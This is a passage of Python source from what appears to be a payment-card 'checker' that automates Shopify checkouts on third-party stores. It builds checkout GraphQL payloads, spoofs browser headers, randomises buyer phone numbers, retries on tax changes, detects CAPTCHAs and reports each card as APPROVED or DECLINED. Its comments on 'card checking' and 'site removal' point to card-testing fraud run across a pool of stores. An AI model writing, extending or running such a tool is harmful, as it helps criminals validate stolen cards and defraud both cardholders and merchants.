                    'number': self._get_random_phone(address['country']),
                    'countryCode': address['country']
                },
                'rememberMe': False,
                'setShippingAddressAsDefault': False
            },
            'tip': {'tipLines': []},
            'taxes': {
                'proposedAllocations': None,
                'proposedTotalAmount': {
                    'value': {
                        'amount': proposal_result['tax_amount'],
                        'currencyCode': address['currency']
                    }
                },
                'proposedTotalIncludedAmount': None,
                'proposedMixedStateTotalAmount': None,
                'proposedExemptions': []
            },
            'note': {'message': None, 'customAttributes': []},
            'localizationExtension': {'fields': []},
            'nonNegotiableTerms': None,
            'scriptFingerprint': {
                'signature': None,
                'signatureUuid': None,
                'lineItemScriptChanges': [],
                'paymentScriptChanges': [],
                'shippingScriptChanges': []
            },
            'optionalDuties': {'buyerRefusesDuties': False},
            'cartMetafields': []
        }
        
        return {
            'variables': {
                'input': base_input,
                'attemptToken': tokens.get('checkout_token', ''),
                'metafields': [],
                'postPurchaseInquiryResult': 'SUCCESS',
                'analytics': {
                    'requestUrl': f'{site_url}/checkouts/cn/{tokens.get("checkout_token", "")}',
                    'pageId': tokens['stable_id']
                },
                'includeTaxStrategyLines': False
            },
            'operationName': 'SubmitForCompletion',
            'id': mutation_ids['SubmitForCompletion']
        }

    def _build_proposal_headers(self, site_url: str, tokens: Dict[str, str]) -> Dict[str, str]:
        """Build headers for proposal requests"""
        return {
            'accept': 'application/json',
            'accept-language': 'en-GB',
            'content-type': 'application/json',
            'origin': site_url,
            'priority': 'u=1, i',
            'referer': f'{site_url}/',
            'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'user-agent': self.COMMON_HEADERS['user-agent'],
            'x-checkout-one-session-token': tokens['session_token'],
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'no',
            'x-checkout-web-source-id': tokens.get('checkout_token', ''),
        }

    def _extract_proposal_result(self, data: Dict[str, Any], min_product: Dict[str, Any], address: Dict[str, str]) -> Dict[str, Any]:
        """Extract proposal result data from response - exactly like index.php"""
        try:
            # Debug logging
            logger.info(f"Extracting proposal result from data keys: {list(data.keys()) if data else 'None'}")
            
            if not data or 'data' not in data:
                raise Exception("No data in response")
                
            if 'session' not in data['data'] or data['data']['session'] is None:
                raise Exception("No session in response data")
                
            if 'negotiate' not in data['data']['session'] or data['data']['session']['negotiate'] is None:
                raise Exception("No negotiate in session data")
                
            result = data['data']['session']['negotiate']['result']
            if not result or 'sellerProposal' not in result:
                raise Exception("No sellerProposal in negotiate result")
                
            seller_proposal = result['sellerProposal']
            if not seller_proposal:
                raise Exception("sellerProposal is None")
            
            # Extract values exactly like index.php does
            delivery_amount = '0'
            tax_amount = '0'
            handle = ''
            signed_handle = ''
            total_amount = min_product['price']
            
            # Extract delivery amount and handle - updated for new API response structure
            if (seller_proposal.get('delivery') and 
                seller_proposal['delivery'].get('deliveryLines') and 
                len(seller_proposal['delivery']['deliveryLines']) > 0):
                
                delivery_line = seller_proposal['delivery']['deliveryLines'][0]
                
                # Extract handle from selectedDeliveryStrategy (new location)
                if (delivery_line.get('selectedDeliveryStrategy') and 
                    delivery_line['selectedDeliveryStrategy'].get('handle')):
                    handle = delivery_line['selectedDeliveryStrategy']['handle']
                
                # Extract delivery amount from availableDeliveryStrategies (fallback to old method)
                if (delivery_line.get('availableDeliveryStrategies') and 
                    len(delivery_line['availableDeliveryStrategies']) > 0):
                    
                    first_strategy = delivery_line['availableDeliveryStrategies'][0]
                    
                    # Extract delivery amount like PHP: $delamount = $firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->amount->value->amount;
                    if first_strategy.get('amount') and first_strategy['amount'].get('value'):
                        delivery_amount = first_strategy['amount']['value'].get('amount', '0')
                    
                    # Fallback: Extract handle from availableDeliveryStrategies if not found in selectedDeliveryStrategy
                    if not handle and first_strategy.get('handle'):
                        handle = first_strategy['handle']
            
            # Extract signedHandle from deliveryExpectations
            if (seller_proposal.get('deliveryExpectations') and 
                seller_proposal['deliveryExpectations'].get('deliveryExpectations') and 
                len(seller_proposal['deliveryExpectations']['deliveryExpectations']) > 0):
                
                first_expectation = seller_proposal['deliveryExpectations']['deliveryExpectations'][0]
                if first_expectation.get('signedHandle'):
                    signed_handle = first_expectation['signedHandle']
                    logger.info(f"Extracted signedHandle: {signed_handle[:50]}...")
            
            # Extract tax amount like PHP: $tax = $firstStrategy->tax->totalTaxAmount->value->amount;
            if (seller_proposal.get('tax') and 
                seller_proposal['tax'].get('totalTaxAmount') and 
                seller_proposal['tax']['totalTaxAmount'].get('value')):
                tax_amount = seller_proposal['tax']['totalTaxAmount']['value'].get('amount', '0')
            
            # Extract total amount like PHP: $totalamt = $firstStrategy->runningTotal->value->amount;
            if (seller_proposal.get('runningTotal') and 
                seller_proposal['runningTotal'].get('value')):
                total_amount = seller_proposal['runningTotal']['value'].get('amount', min_product['price'])
            
            logger.info(f"Extracted proposal result (like index.php) - delivery: {delivery_amount}, tax: {tax_amount}, total: {total_amount}, handle: {handle}, signedHandle: {'present' if signed_handle else 'missing'}")
            
            return {
                'delivery_amount': delivery_amount,
                'tax_amount': tax_amount,
                'handle': handle,
                'signed_handle': signed_handle,
                'total_amount': total_amount,
                'currency': address['currency']
            }
            
        except Exception as e:
            logger.error(f"Error extracting proposal result: {e}")
            # Log the actual response structure for debugging
            if data:
                logger.error(f"Response structure: {json.dumps(data, indent=2)[:1000]}...")
            raise
    
    def _submit_checkout(self, session, site_url: str, tokens: Dict[str, str], min_product: Dict[str, Any], 
                        address: Dict[str, str], cc_session_id: str, proposal_result: Dict[str, Any]) -> Dict[str, Any]:
        """Submit checkout for completion using mutation IDs"""
        try:
            # Get mutation IDs for this site (should be cached from proposal step, but pass tokens just in case)
            mutation_ids = self._get_site_mutation_ids(session, site_url, tokens)
            if not mutation_ids or 'SubmitForCompletion' not in mutation_ids:
                raise ValueError("Could not get SubmitForCompletion mutation ID for site")
            
            # Determine delivery method type
            delivery_method_type = tokens.get('delivery_method_type', 'NONE')
            
            # Build SubmitForCompletion payload using mutation ID
            submit_payload = self._build_submit_for_completion_payload(
                tokens, min_product, address, cc_session_id, proposal_result, 
                delivery_method_type, mutation_ids, site_url
            )
            
            # Submit checkout
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US',
                'content-type': 'application/json',
                'origin': site_url,
                'priority': 'u=1, i',
                'referer': f'{site_url}/',
                'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': self.COMMON_HEADERS['user-agent'],
                'x-checkout-one-session-token': tokens['session_token'],
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-server-rendering': 'no',
                'x-checkout-web-source-id': tokens.get('checkout_token', ''),
            }
            
            response = session.post(
                f'{site_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion',
                headers=headers,
                json=submit_payload,
                timeout=30
            )
            response.raise_for_status()
            
            data = response.json()
            print(data)
            
            # Check for tax-related errors and handle them
            if 'errors' in data:
                tax_error = None
                for error in data['errors']:
                    if error.get('code') == 'TAX_NEW_TAX_MUST_BE_ACCEPTED':
                        tax_error = error
                        break
                
                if tax_error:
                    logger.info("Tax amount changed, extracting new tax amount and retrying...")
                    # Extract new tax amount from the error response
                    if ('data' in data and 'session' in data['data'] and 
                        'negotiate' in data['data']['session'] and 
                        'result' in data['data']['session']['negotiate'] and
                        'sellerProposal' in data['data']['session']['negotiate']['result']):
                        
                        seller_proposal = data['data']['session']['negotiate']['result']['sellerProposal']
                        
                        # Extract new tax amount
                        new_tax_amount = '0'
                        if (seller_proposal.get('tax') and 
                            seller_proposal['tax'].get('totalTaxAmount') and 
                            seller_proposal['tax']['totalTaxAmount'].get('value')):
                            new_tax_amount = seller_proposal['tax']['totalTaxAmount']['value'].get('amount', '0')
                        
                        logger.info(f"Found new tax amount: {new_tax_amount}, updating proposal result and retrying...")
                        
                        # Update the proposal result with new tax amount
                        proposal_result['tax_amount'] = new_tax_amount
                        
                        # Extract new total amount if available
                        if (seller_proposal.get('runningTotal') and 
                            seller_proposal['runningTotal'].get('value')):
                            new_total_amount = seller_proposal['runningTotal']['value'].get('amount', proposal_result['total_amount'])
                            proposal_result['total_amount'] = new_total_amount
                            logger.info(f"Updated total amount: {new_total_amount}")
                        
                        # Rebuild the submit payload with updated amounts
                        submit_payload = self._build_submit_for_completion_payload(
                            tokens, min_product, address, cc_session_id, proposal_result, 
                            delivery_method_type, mutation_ids, site_url
                        )
                        
                        # Retry the submission with updated tax amount
                        logger.info("Retrying submission with updated tax amount...")
                        response = session.post(
                            f'{site_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion',
                            headers=headers,
                            json=submit_payload,
                            timeout=30
                        )
                        response.raise_for_status()
                        data = response.json()
                        print("Retry response:", data)
            
            # Check for CAPTCHA
            if 'errors' in data and any('CAPTCHA_METADATA_MISSING' in str(error) for error in data['errors']):
                raise Exception("HCAPTCHA DETECTED")
            
            # Extract receipt ID
            receipt_id = None
            if 'data' in data and 'submitForCompletion' in data['data']:
                submit_result = data['data']['submitForCompletion']
                if 'receipt' in submit_result and 'id' in submit_result['receipt']:
                    receipt_id = submit_result['receipt']['id']
            
            if not receipt_id:
                raise Exception("Failed to get receipt ID from checkout submission")
            
            return {'receipt_id': receipt_id}
            
        except Exception as e:
            logger.error(f"Error submitting checkout: {e}")
            raise
    
    def _poll_receipt(self, session, site_url: str, tokens: Dict[str, str], receipt_id: str, retry_count: int = 0) -> Dict[str, Any]:
        """Poll for receipt completion using mutation IDs - like index.php with retry logic"""
        try:
            # Get mutation IDs for this site (should be cached from previous steps)
            mutation_ids = self._get_site_mutation_ids(session, site_url)
            
            # For polling, we might need to find the Poll mutation ID
            # If not available, we'll use a simplified approach
            poll_mutation_id = mutation_ids.get('Poll') or mutation_ids.get('PollForReceipt')
            
            max_polls = 10
            poll_count = 0
            
            while poll_count < max_polls:
                poll_count += 1
                
                # Wait before polling
                sleep(2)
                
                if poll_mutation_id:
                    # Use mutation ID if available - send as GET request with URL parameters
                    import json
                    import urllib.parse
                    
                    variables = {
                        'receiptId': receipt_id,
                        'sessionToken': tokens['session_token']
                    }
                    
                    # Build URL with query parameters
                    params = {
                        'operationName': 'PollForReceipt',
                        'variables': json.dumps(variables),
                        'id': poll_mutation_id
                    }
                    
                    # Update headers to match curl exactly
                    headers = {
                        'accept': 'application/json',
                        'accept-language': 'en-US',
                        'content-type': 'application/json',
                        'priority': 'u=1, i',
                        'referer': f'{site_url}/checkouts/cn/{tokens.get("checkout_token", "")}/en-us',
                        'sec-ch-ua': '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'shopify-checkout-client': 'checkout-web/1.0',
                        'shopify-checkout-source': f'id="{tokens.get("checkout_token", "")}", type="cn"',
                        'user-agent': self.COMMON_HEADERS['user-agent'],
                        'x-checkout-one-session-token': tokens['session_token'],
                        'x-checkout-web-build-id': '0fdb7fc0a43cfcbf7a627adfc47b660eb15c4bf6',
                        'x-checkout-web-deploy-stage': 'production',
                        'x-checkout-web-server-handling': 'fast',
                        'x-checkout-web-server-rendering': 'yes',
                        'x-checkout-web-source-id': tokens.get('checkout_token', ''),
                    }
                    print(session.cookies)
                    try:
                        # Send as GET request with parameters in URL
                        response = session.get(
                            f'{site_url}/checkouts/internal/graphql/persisted',
                            headers=headers,
                            params=params,  # Changed to GET with params
                            timeout=30
                        )
                        response.raise_for_status()
                        
                        data = response.json()
                        
                    except Exception as poll_error:
                        logger.warning(f"Error in poll {poll_count}/{max_polls}: {poll_error}")
                        # Continue to next poll attempt instead of failing completely
                        continue
                # Process GraphQL response (only if we have poll_mutation_id and successful response)
                if poll_mutation_id and 'data' in data and 'receipt' in data['data']:
                    receipt = data['data']['receipt']
                    
                    # Check for ProcessedReceipt (successful completion)
                    if receipt.get('__typename') == 'ProcessedReceipt':
                        # Extract payment details from ProcessedReceipt
                        total_amount = None
                        currency = 'USD'
                        
                        if 'purchaseOrder' in receipt and receipt['purchaseOrder']:
                            purchase_order = receipt['purchaseOrder']
                            if 'totalAmountToPay' in purchase_order:
                                total_amount = purchase_order['totalAmountToPay'].get('amount')
                                currency = purchase_order['totalAmountToPay'].get('currencyCode', 'USD')
                        
                        return {
                            'result': 'APPROVED',
                            'total_amount': total_amount,
                            'currency': currency,
                            'receipt_type': 'ProcessedReceipt',
                            'data': receipt
                        }
                    
                    # Check for FailedReceipt (declined/failed)
                    elif receipt.get('__typename') == 'FailedReceipt':
                        processing_error = receipt.get('processingError', {})
                        error_code = processing_error.get('code', 'UNKNOWN_ERROR')
                        return {
                            'result': 'DECLINED',
                            'error_code': error_code,
                            'error_message': processing_error.get('messageUntranslated', 'Payment failed'),
                            'data': receipt
                        }
                    
                    # Check for successful completion with redirect URL (legacy check)
                    elif 'redirectUrl' in receipt and receipt['redirectUrl']:
                        redirect_url = receipt['redirectUrl']
                        if '/thank_you' in redirect_url or '/post_purchase' in redirect_url:
                            return {
                                'result': 'APPROVED',
                                'redirect_url': redirect_url,
                                'data': receipt
                            }
                    
                    # Check for confirmation page URL (alternative success indicator)
                    elif 'confirmationPage' in receipt and receipt['confirmationPage']:
                        confirmation_page = receipt['confirmationPage']
                        if 'url' in confirmation_page and confirmation_page['url']:
                            return {
                                'result': 'APPROVED',
                                'confirmation_url': confirmation_page['url'],
                                'data': receipt
                            }
                    
                    # Check if still processing or waiting
                    elif '__typename' in receipt:
                        typename = receipt['__typename']
                        if typename in ['WaitingReceipt', 'ProcessingReceipt']:
                            logger.info(f"Receipt still processing (poll {poll_count}/{max_polls}): {typename}")
                            continue
                
                # If we get here, check response text for success indicators (with null check)
                if poll_mutation_id and 'response' in locals():
                    response_text = response.text
                    if response_text and ('thank_you' in response_text.lower() or 'post_purchase' in response_text.lower()):
                        return {
                            'result': 'APPROVED',
                            'message': 'Payment successful',
                            'data': data if 'data' in locals() else {}
                        }
            
            # If we've exhausted all polls without a definitive result
            logger.warning(f"Polling completed without definitive result on {site_url} (retry {retry_count + 1})")
            
            # For card checking (not site testing), return DECLINED instead of raising exception
            # This prevents site removal due to polling timeouts during normal card checking
            return {
                'result': 'DECLINED',
                'error_code': '3D_SECURE_REQUIRED',
                'error_message': '3D Secure Required',
                'data': {}
            }
            
        except Exception as e:
            logger.error(f"Error polling receipt: {e}")
            # Re-raise the exception to be handled by the calling method
            raise

